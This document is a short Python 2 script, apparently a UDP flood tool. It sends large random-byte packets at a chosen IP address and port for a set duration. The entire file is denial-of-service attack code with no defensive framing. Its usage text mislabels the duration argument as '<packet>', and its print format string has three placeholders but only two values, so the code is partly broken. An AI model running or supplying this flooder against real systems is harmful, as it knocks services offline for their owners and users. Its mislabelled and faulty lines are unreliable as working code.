import time
import socket
import random
import sys

def usage():
    print "Command: " + sys.argv[0] + " <ip> <port> <packet>"

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(16535)
    timeout =  time.time() + duration

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        print "Attacking %s sent packages %s at the port %s "%(victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
